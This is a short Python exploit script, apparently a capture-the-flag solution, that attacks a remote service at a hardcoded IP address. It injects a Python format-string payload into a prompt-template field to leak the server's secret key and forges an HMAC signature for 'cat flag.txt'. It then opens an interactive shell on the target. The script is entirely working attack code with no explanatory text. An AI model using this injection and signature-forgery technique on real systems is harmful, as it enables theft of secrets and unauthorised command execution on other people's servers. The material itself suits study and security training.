from pwn import *
from ast import literal_eval
import hmac

attribute = '{1.__init__.__func__.__globals__[SECRET]}'
cmd = b'cat flag.txt'

def parse(sec):
    i = 2
    parsed = ''
    while i < len(sec)-1:
        if sec[i:i+2] == '\\x':
            parsed += sec[i+2:i+4]
            i += 4
        else:
            parsed += f'{format(ord(sec[i]), "02x")}'
            i += 1
    return parsed

def main():
    r = remote("138.68.101.239", 6666)
    r.sendlineafter('>>> ', '2')
    r.sendlineafter('New prompt template: ', attribute)

    r.sendlineafter('>>> ', b'1\n'+cmd)
    r.recvuntil("'")
    secret = r.recvuntil("'", drop=True)
    secret = literal_eval(f'"{secret}"')
    secret = parse(secret)
    log.info(f'Leaked SECRET : {secret}')
    binary_secret = binascii.a2b_hex(secret) 

    signature = hmac.new(binary_secret, cmd, hashlib.sha256).hexdigest()
    log.info(f'HMAC Signature : {signature}')

    r.sendline(signature)
    r.sendline('exec >&2')
    r.interactive()

if __name__ == "__main__":
    main()
